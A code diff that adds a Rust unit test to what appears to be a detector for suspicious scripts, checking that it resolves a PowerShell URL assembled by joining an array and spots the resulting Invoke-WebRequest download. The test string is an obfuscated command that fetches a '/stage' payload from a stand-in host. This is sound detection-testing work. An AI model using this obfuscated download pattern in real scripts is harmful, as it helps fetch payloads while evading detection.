@@ -6431,6 +6431,23 @@ mod ps_replace_join_tests {
         });
         assert!(has, "no Download after -join: {:?}", report.traits);
     }
+
+    #[test]
+    fn ps_array_subexpression_variable_join_resolves() {
+        let inner = r#"$p=@('https://','ps-array-var.example','/stage');$u=$p -join '';Invoke-WebRequest $u"#;
+        let script = format!("powershell -Command \"{}\"\r\n", inner);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src.contains("https://ps-array-var.example/stage")
+            )
+        });
+        assert!(
+            has,
+            "no Download after @() array variable join: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
